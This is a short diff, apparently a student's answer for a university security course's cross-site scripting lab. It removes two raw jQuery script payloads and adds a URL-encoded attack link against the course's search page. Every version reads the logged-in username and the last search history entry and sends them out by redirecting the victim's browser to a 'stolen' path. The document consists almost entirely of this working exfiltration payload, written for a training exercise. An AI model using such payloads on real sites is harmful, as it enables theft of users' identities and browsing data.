@@ -1,3 +1,1 @@
-<script>$(document).ready(function(){location.pathname="stolen?user=" + $("#logged-in-user").text() + "&last_search=" + $("#history-list .history-item:eq(1)").text()})</script>
-<script>$(document).ready(function(){location.pathname="stolen?xssdefense=0&user=" + $("#logged-in-user").text() + "&last_search=" + $("#history-list .history-item:eq(1)").text()})</script>
-#need to add the nevessary url params to this
+https://eecs388.org/project2/search?xss_defense=0&q=%3Cscript%3E%24(document).ready(function()%7Blocation.pathname%3D%22stolen%3Fxssdefense%3D0%26user%3D%22%20%2B%20%24(%22%23logged-in-user%22).text()%20%2B%20%22%26last_search%3D%22%20%2B%20%24(%22%23history-list%20.history-item%3Aeq(1)%22).text()%7D)%3C%2Fscript%3E
